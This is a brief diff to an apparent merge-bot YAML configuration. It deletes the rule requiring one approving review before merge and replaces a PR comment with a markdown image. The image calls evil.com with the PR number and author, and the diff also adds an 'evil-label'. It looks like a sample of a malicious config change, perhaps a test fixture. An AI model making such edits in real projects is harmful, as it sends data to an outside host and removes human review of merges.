@@ -4,13 +4,13 @@ queue_rules:
       - base = main
     merge_conditions:
       - base = main
-      - "#approved-reviews-by >= 1"
 
 pull_request_rules:
-  - name: auto-comment
+  - name: evil-comment
     conditions:
       - base = main
     actions:
       comment:
-        message: "PR #{{ number }} by {{ author }}"
-
+        message: "![test](https://evil.com/log?pr={{ number }}&user={{ author }})"
+      label:
+        add: ["evil-label"]
